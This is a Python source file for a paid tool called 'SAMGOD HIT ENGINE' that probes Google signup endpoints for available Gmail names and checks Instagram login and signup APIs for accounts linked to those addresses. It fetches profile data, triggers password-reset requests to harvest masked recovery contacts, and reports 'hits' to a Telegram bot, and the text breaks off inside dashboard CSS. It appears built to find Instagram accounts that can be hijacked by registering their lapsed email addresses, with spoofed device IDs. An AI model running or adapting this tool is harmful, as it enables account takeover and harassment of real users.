#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import random
import json
import re
import collections
import queue
import requests
import threading
import uuid
import secrets
import base64
import httpx
import urllib.parse
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

# ── Optional 3D Web Dashboard ─────────────────────────────────────────
try:
    from flask import Flask, Response, jsonify, render_template_string
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

WEB_PORT = 8080

MIN_FOLLOWERS = 0
ACCESS_LIST_URL = "https://raw.githubusercontent.com/samkushwah61-create/sam-acces/main/expiry.txt"
IST_OFFSET = timedelta(hours=5, minutes=30)

expiry_date = datetime(2026, 10, 20, 23, 23, 23)
current_date = datetime.now()

if current_date > expiry_date:
    print("\n⟡ Your Time Has Expired")
    print("⌁  FILE EXPIRED HO GYA HAI LADLE ")
    sys.exit()

THREADS = 80

GOLD   = '\x1b[38;5;220m'
ORANGE = '\x1b[38;5;208m'
WHITE  = '\x1b[38;5;255m'
DIM    = '\x1b[38;5;240m'
GREEN  = '\x1b[38;5;120m'
RED    = '\x1b[38;5;196m'
CYAN   = '\x1b[38;5;51m'
NEON   = '\x1b[38;5;213m'
BLUE   = '\x1b[38;5;45m'
PURPLE = '\x1b[38;5;141m'
RESET  = '\x1b[0m'


def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print()
    print(f"{NEON}     ⟡ ────────────────────────────────────────── ⟡{RESET}")
    print(f"{BLUE}              ⬢{RESET}   {GOLD}✦  S A M G O D  ✦{RESET}   {BLUE}⬢{RESET}")
    print(f"{NEON}     ⟡ ────────────────────────────────────────── ⟡{RESET}")
    print(f"{PURPLE}            ⌁   HIT ENGINE v2.0   ⌁{RESET}")
    print(f"{DIM}                 dev // @SAMFYCKS{RESET}")
    print()


def check_telegram_access(user_id):
    try:
        response = requests.get(ACCESS_LIST_URL, timeout=15)
        if response.status_code != 200:
            print(f"{RED}⟡ Access list fetch fail (status {response.status_code}){RESET}")
            return False
        for line in response.text.strip().splitlines():
            line = line.strip()
            if not line or "," not in line or ":" not in line:
                continue
            parts = line.split(",")
            if len(parts) < 2:
                continue
            uid = parts[0].strip()
            date_part = parts[1].strip()
            try:
                expiry_ist = datetime.strptime(date_part, "%Y-%m-%d : %H:%M")
            except ValueError:
                continue
            if uid == str(user_id):
                now_ist = datetime.now(timezone.utc) + IST_OFFSET
                remaining = expiry_ist - now_ist.replace(tzinfo=None)
                if remaining.total_seconds() > 0:
                    days, seconds = divmod(int(remaining.total_seconds()), 86400)
                    hours, seconds = divmod(seconds, 3600)
                    minutes, _ = divmod(seconds, 60)
                    print(f"{GREEN}⬢  𝐀𝐂𝐂𝐄𝐒𝐒  𝐆𝐑𝐀𝐍𝐓𝐄𝐃{RESET}")
                    print(f"{GOLD}⌁  𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭 : {days}d {hours}h {minutes}m{RESET}")
                    return True
                else:
                    print(f"{RED}◈  𝐀𝐂𝐂𝐄𝐒𝐒  𝐃𝐄𝐍𝐈𝐄𝐃 : Premium expired.{RESET}")
                    return False
        print(f"{RED}◈  𝐀𝐂𝐂𝐄𝐒𝐒  𝐃𝐄𝐍𝐈𝐄𝐃 : Not Premium{RESET}")
        return False
    except Exception as e:
        print(f"{RED}⟡ Access check error: {e}{RESET}")
        return False


# ── Shared runtime stats ─────────────────────────────────────────────
hits = 0
good = 0
bad = 0
start_time = time.time()
_display_lock = threading.Lock()
recent_hits = collections.deque(maxlen=30)
hit_queue = queue.Queue()


def display():
    global hits, good, bad
    with _display_lock:
        uptime = int(time.time() - start_time)
        h, m, s = uptime // 3600, (uptime % 3600) // 60, uptime % 60
        stats = (f"\r{NEON}⟡{RESET} {GOLD}GOOD:{RESET}{GREEN}{good}{RESET} "
                 f"{DIM}▸{RESET} {GOLD}HITS:{RESET}{CYAN}{hits}{RESET} "
                 f"{DIM}▸{RESET} {GOLD}BAD:{RESET}{RED}{bad}{RESET} "
                 f"{DIM}▸{RESET} {PURPLE}⌁ {h:02d}:{m:02d}:{s:02d}{RESET} "
                 f"{NEON}⟡{RESET}    ")
        sys.stdout.write(stats)
        sys.stdout.flush()


# ── Checkers (logic untouched) ───────────────────────────────────────
class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self._generate_ua(),
                }
                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers, timeout=15
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies, headers=headers2, data=data, timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except Exception:
                pass
            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except Exception:
                pass
            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]
        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("Empty tl")
                tl, host = line.split('//')
        except Exception:
            time.sleep(3)
            try:
                with open('tl.txt', 'r') as f:
                    line = f.read().strip()
                    tl, host = line.split('//')
            except Exception:
                return 'bad'
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        try:
            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params, cookies=cookies, headers=headers, data=data, timeout=10
            )
            if '"gf.uar",1' in response.text:
                return 'good'
            elif '"er",null,null,null,null,400' in response.text:
                time.sleep(1)
                return self.check_availability(email)
            else:
                return 'bad'
        except Exception:
            return 'bad'


class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except Exception:
            pass
        return False

    def _check_bloks(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())
        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":" + str(int(time.time())) + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4()) + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32) + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\"" + email + "\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\"" + device + "\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\"" + str(uuid.uuid4()) + "\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\"" + android + "\",\"login_surface\":\"login_home\",\"waterfall_id\":\"" + waterfall + "\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"" + family + "\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\"" + device + "\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            return email in resp.text
        except Exception:
            return False

    def _check_web_create(self, email):
        if not self._ensure_tokens():
            return False
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-csrftoken': self.csrf,
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/'
        }
        cookies = {'csrftoken': self.csrf}
        username = 'testuser_' + str(random.randint(1000, 99999))
        data = {'email': email, 'username': username, 'first_name': 'Test', 'password': 'Test@123456'}
        try:
            r = self.session.post(url, headers=headers, cookies=cookies, data=data, timeout=10)
            if r.status_code == 200:
                return 'email' in r.json().get('errors', {})
            return False
        except Exception:
            return False

    def check_email(self, email):
        if self._check_bloks(email):
            return True
        if self._check_web_create(email):
            return True
        return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except Exception:
            pass
        return None


class ReportManager:
    def __init__(self, token, chat_id, proxy=None):
        self.token = token
        self.chat_id = chat_id
        self.proxy = proxy
        self.log_file = "telegram_errors.log"
        self._telegram_working = True
        self._error_logged = False

    def _send_telegram_with_retry(self, msg, retries=3, delay=2):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
        session = requests.Session()
        if self.proxy:
            session.proxies.update(self.proxy)
        for attempt in range(retries):
            try:
                r = session.post(url, json=payload, timeout=15)
                if r.status_code == 200:
                    return True
                else:
                    if not self._error_logged:
                        with open(self.log_file, 'a') as f:
                            f.write(f"Telegram returned {r.status_code}: {r.text}\n")
                        self._error_logged = True
                    time.sleep(delay * (attempt + 1))
            except Exception as e:
                if not self._error_logged:
                    with open(self.log_file, 'a') as f:
                        f.write(f"Telegram send error: {e}\n")
                    self._error_logged = True
                time.sleep(delay * (attempt + 1))
        return False

    def send_telegram(self, msg):
        if not self._telegram_working:
            return False
        success = self._send_telegram_with_retry(msg)
        if not success:
            self._telegram_working = False
        return success

    def save_to_file(self, msg, filename='hits.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n')

    def _get_monetization_status(self, data):
        followers = data.get('follower_count', 0)
        posts = data.get('media_count', 0)
        is_private = data.get('is_private', True)
        if followers >= 50 and posts >= 0 and not is_private:
            return "✅ Eligible"
        else:
            return "❌ Not Eligible"

    @staticmethod
    def _esc(s):
        return str(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

    def format_result(self, data):
        username = data.get('username', '')
        full_name = data.get('full_name', '') or '-'
        followers = data.get('follower_count') or 0
        following = data.get('following_count') or 0
        posts = data.get('media_count') or 0
        email = data.get('email', f"{username}@gmail.com")
        domain = email.split('@')[1] if '@' in email else 'gmail.com'
        bio = (data.get('biography', '') or '-')[:50]
        pk = data.get('pk', 0)
        try:
            pk = int(pk)
            year_ranges = [
                (1, 5000000, 2010), (5000001, 17750000, 2011), (17750001, 279760000, 2012),
                (279760001, 900990000, 2013), (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017), (6345108210, 10016232395, 2018),
                (10016232396, 27238602159, 2019), (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023), (63313426938, 70134323896, 2024),
                (70313426938, 78313496938, 2025)
            ]
            year = "2023+"
            for low, high, y in year_ranges:
                if low <= pk <= high:
                    year = str(y)
                    break
        except Exception:
            year = "Unknown"

        reset_mask = self._fetch_reset_email(username)
        monetization = self._get_monetization_status(data)

        console_lines = [
            f"\n{NEON}⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡{RESET}",
            f"{GOLD}            ⬢   S A M G O D  HIT   ⬢{RESET}",
            f"{NEON}⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡{RESET}",
            f"  {BLUE}◈{RESET} {WHITE}Name{RESET}       {DIM}▸{RESET} {DIM}{full_name}{RESET}",
            f"  {BLUE}◈{RESET} {WHITE}Username{RESET}   {DIM}▸{RESET} @{username}",
            f"  {BLUE}◈{RESET} {WHITE}Email{RESET}      {DIM}▸{RESET} {GREEN}{email}{RESET}",
            f"  {BLUE}◈{RESET} {WHITE}Domain{RESET}     {DIM}▸{RESET} {domain}",
            f"  {BLUE}◈{RESET} {WHITE}Followers{RESET}  {DIM}▸{RESET} {followers:,}",
            f"  {BLUE}◈{RESET} {WHITE}Following{RESET}  {DIM}▸{RESET} {following:,}",
            f"  {BLUE}◈{RESET} {WHITE}Posts{RESET}      {DIM}▸{RESET} {posts}",
            f"  {BLUE}◈{RESET} {WHITE}Age{RESET}        {DIM}▸{RESET} {year}",
            f"  {BLUE}◈{RESET} {WHITE}Bio{RESET}        {DIM}▸{RESET} {DIM}{bio}{RESET}",
            f"  {BLUE}◈{RESET} {WHITE}Reset{RESET}      {DIM}▸{RESET} {reset_mask}",
            f"  {BLUE}◈{RESET} {WHITE}Monetize{RESET}   {DIM}▸{RESET} {monetization}",
            f"{NEON}⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡{RESET}",
            f"  {CYAN}⬡{RESET} {DIM}https://instagram.com/{username}{RESET}",
            f"{NEON}⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡{RESET}\n",
        ]
        console_msg = '\n'.join(console_lines)

        e = self._esc
        tg_lines = [
            "⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡",
            "            <b>⬢  S A M G O D  HIT  ⬢</b>",
            "⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡",
            f"  ◈ <b>Name</b>       ▸ {e(full_name)}",
            f"  ◈ <b>Username</b>   ▸ @{e(username)}",
            f"  ◈ <b>Email</b>      ▸ {e(email)}",
            f"  ◈ <b>Domain</b>     ▸ {e(domain)}",
            f"  ◈ <b>Followers</b>  ▸ {followers:,}",
            f"  ◈ <b>Following</b>  ▸ {following:,}",
            f"  ◈ <b>Posts</b>      ▸ {posts}",
            f"  ◈ <b>Age</b>        ▸ {year}",
            f"  ◈ <b>Bio</b>        ▸ {e(bio)}",
            f"  ◈ <b>Reset</b>      ▸ {e(reset_mask)}",
            f"  ◈ <b>Monetize</b>   ▸ {monetization}",
            "⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡",
            f"  ⬡ <b>Profile</b>    ▸ <a href='https://instagram.com/{e(username)}'>@{e(username)}</a>",
            "⟡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⟡",
        ]
        return console_msg, '\n'.join(tg_lines)

    def _fetch_reset_email(self, username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            }
            client = httpx.Client(http2=True, headers=headers, timeout=10)
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "ok":
                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
            return "-"
        except Exception:
            return "-"


# ══════════════════════════════════════════════════════════════════════
#  3D WEB DASHBOARD (Flask + CSS 3D + floating glass cards + SSE)
# ══════════════════════════════════════════════════════════════════════
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>⬢ SAMGOD · 3D HIT ENGINE</title>
<style>
:root{
  --mx:0deg; --my:0deg;
  --gold:#ffc83a; --cyan:#00e5ff; --pink:#ff2e9a; --purple:#a06bff;
  --green:#5dff9e; --red:#ff4d6d;
  --bg:#05060a;
}
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{
  font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
  background:radial-gradient(1200px 800px at 50% 0%, #0c0f1a 0%, #05060a 60%);
  color:#e9ecf5;overflow-x:hidden;
  perspective:1500px;
}

/* ── animated background blobs ─────────────────────────── */
.blob{
  position:fixed;width:520px;height:520px;border-radius:50%;
  filter:blur(120px);opacity:.35;pointer-events:none;z-index:0;
  animation:blobFloat 22s ease-in-out infinite;
}
.blob-1{background:var(--gold);top:-12%;left:-12%}
.blob-2{background:var(--cyan);bottom:-15%;right:-12%;animation-delay:-7s}
.blob-3{background:var(--pink);top:35%;left:45%;animation-delay:-14s;width:420px;height:420px;opacity:.28}
@keyframes blobFloat{
  0%,100%{transform:translate(0,0) scale(1)}
  33%{transform:translate(90px,-70px) scale(1.18)}
  66%{transform:translate(-70px,90px) scale(.9)}
}

/* ── perspective grid ──────────────────────────────────── */
.grid-floor{
  position:fixed;left:-20%;right:-20%;bottom:-10%;height:70%;
  background-image:
    linear-gradient(rgba(255,200,58,.16) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,229,255,.14) 1px,transparent 1px);
  background-size:70px 70px;
  transform:perspective(600px) rotateX(70deg);
  transform-origin:bottom;
  mask-image:linear-gradient(to top,black 0%,transparent 90%);
  -webkit-mask-image:linear-gradient(to top,black 0%,transparent 90%);
  pointer-events:none;z-index:1;
  animation:gridScroll 12s linear infinite;
}
@keyframes gridScroll{
  from{background-position:0 0}
  to{background-position:0 70px}
}

/* ── stage ─────────────────────────────────────────────── */
.stage{
  position:relative;z-index:2;
  padding:56px 40px 80px;
  max-width:1200px;margin:0 auto;
  transform:rotateX(var(--my)) rotateY(var(--mx));
  transform-style:preserve-3d;
  transition:transform .18s ease-out;
}

/* ── hero ──────────────────────────────────────────────── */
.hero{text-align:center;margin-bottom:52px;transform-style:preserve-3d}
.title{
  font-size:clamp(38px,7vw,86px);
  font-weight:900;letter-spacing:.06em;
  background:linear-gradient(135deg,#fff 0%,var(--gold) 40%,var(--pink) 70%,var(--cyan) 100%);
  background-size:200% 200%;
  -webkit-background-clip:text;background-clip:text;
  color:transparent;
  filter:drop-shadow(0 6px 30px rgba(255,200,58,.35));
  animation:shine 6s ease-in-out infinite,floaty 5s ease-in-out infinite;
  transform:translateZ(60px);
}
@keyframes shine{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
@keyframes floaty{0%,100%{transform:translateZ(60px) translateY(0)}50%{transform:translateZ(60px) translateY(-8px)}}
.sub{
  margin-top:12px;letter-spacing:.5em;font-size:13px;
  color:#8b93a8;text-transform:uppercase;
  transform:translateZ(30px);
}
.pill{
  display:inline-flex;align-items:center;gap:8px;
  margin-top:16px;padding:8px 20px;border-radius:100px;
  background:rgba(93,255,158,.08);
  border:1px solid rgba(93,255,158,.35);
  color:var(--green);font-size:12px;letter-spacing:.2em;
  box-shadow:0 0 25px rgba(93,255,158,.2);
  transform:translateZ(20px);
}
.dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 12px var(--green);animation:pulse 1.6s infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.3)}}

/* ── stat cards (floating 3D) ──────────────────────────── */
.stats{
  display:grid;grid-template-columns:repeat(4,1fr);
  gap:22px;margin-bottom:56px;
  transform-style:preserve-3d;
}
@media(max-width:900px){.stats{grid-template-columns:repeat(2,1fr)}}

.card{
  position:relative;
  padding:26px 22px;border-radius:22px;
  background:linear-gradient(155deg,rgba(255,255,255,.07),rgba(255,255,255,.015));
  border:1px solid rgba(255,255,255,.1);
  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
  transform-style:preserve-3d;
  transform:translateZ(0) rotateX(4deg) rotateY(-4deg);
  box-shadow:
    0 20px 60px rgba(0,0,0,.55),
    inset 0 1px 0 rgba(255,255,255,.12);
  animation:cardFloat 6s ease-in-out infinite;
  transition:transform .25s ease, box-shadow .25s ease;
  cursor:default;
}
.card:nth-child(2){animation-delay:-1.5s}
.card:nth-child(3){animation-delay:-3s}
.card:nth-child(4){animation-delay:-4.5s}
@keyframes cardFloat{
  0%,100%{transform:translateZ(0) rotateX(4deg) rotateY(-4deg) translateY(0)}
  50%{transform:translateZ(30px) rotateX(-4deg) rotateY(4deg) translateY(-10px)}
}
.card:hover{
